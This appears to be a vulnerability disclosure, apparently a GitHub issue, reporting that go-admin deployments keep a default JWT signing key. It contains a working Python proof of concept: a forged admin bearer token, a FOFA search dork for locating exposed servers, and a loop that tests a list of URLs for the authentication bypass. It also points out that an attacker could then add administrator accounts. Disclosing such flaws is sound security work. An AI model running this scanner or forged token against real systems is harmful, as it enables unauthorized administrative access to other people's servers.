| Description: Although the configuration file has prompted that the token needs to be modified, most users will still copy a directly if the change is not forced. The key of Jwt is still 'go admin', including the production environment. [image](https://user-images.githubusercontent.com/97162651/195369693-c74380b8-7bb3-4521-b0c2-cbb1dac65c72.png)  You can use a common jwt to access the API [image](https://user-images.githubusercontent.com/97162651/195369729-1dac1f87-897f-49a3-a2ca-335062e01ef2.png) POC： ``` # fofadork: icon_hash="-1533452521" import requests  proxy={'http':None,'https':None}  def req(url):     header = {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhc2NvcGUiOiIiLCJleHAiOjQ4MTg5MTg2MzAsImlkZW50aXR5IjoxLCJuaWNlIjoiYWRtaW4iLCJvcmlnX2lhdCI6MTY2NTI4MjYzMCwicm9sZWlkIjoxLCJyb2xla2V5IjoiYWRtaW4iLCJyb2xlbmFtZSI6Iuezu-e7n-euoeeQhuWRmCJ9.D08ymyYAo6giFJd8XEhqo6yjIaIZzfg0mi4j28rwwoc'}     uri = "/api/v1/getinfo"     s = requests.session()     res = s.get(url+uri,headers=header,proxies=proxy,timeout=5)     if "requestId" in res.text:         print(url)         print(res.text)  with open('url.txt') as f:     file = f.readlines()  for i in file:     x = i.strip("\n")     try:         req(x)     except:         pass ```  Randomly test multiple go admins. It is found that most URLs can bypass the authentication access API directly through the tampered Jwt. The figure shows the getinfo interface (if you want to attack, you can directly add users with administrator privileges by adding user interfaces).
